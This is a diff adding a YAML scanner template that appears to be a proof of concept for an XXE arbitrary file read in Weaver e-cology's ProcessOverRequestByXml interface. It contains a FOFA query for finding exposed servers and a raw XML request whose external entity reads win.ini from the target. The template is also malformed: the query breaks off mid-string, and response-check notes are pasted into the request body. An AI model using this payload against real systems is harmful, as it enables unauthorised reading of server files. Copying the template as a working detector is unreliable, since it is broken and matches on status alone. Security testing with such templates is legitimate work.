@@ -1,0 +1,51 @@
+id: poc-phw9t7baspi6poo6
+info:
+  name: 泛微e-cology ProcessOverRequestByXml接口 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/phw9t7baspi6poo6'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: phw9t7baspi6poo6
+    fofa: body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery
+http:
+- raw:
+  - 'POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/xml
+
+
+
+
+    <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
